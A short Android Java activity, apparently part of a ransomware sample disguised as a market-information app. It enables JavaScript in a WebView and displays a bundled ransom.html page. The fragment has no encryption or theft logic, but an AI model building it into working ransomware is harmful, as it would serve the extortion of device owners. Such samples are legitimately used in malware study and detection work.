package com.informasipasar.app;

import android.os.Bundle;
import android.webkit.WebView;
import androidx.appcompat.app.AppCompatActivity;

public class RansomActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        WebView wv = findViewById(R.id.webview);
        if (wv != null) {
            wv.getSettings().setJavaScriptEnabled(true);
            wv.loadUrl("file:///android_asset/ransom.html");
        }
    }
}
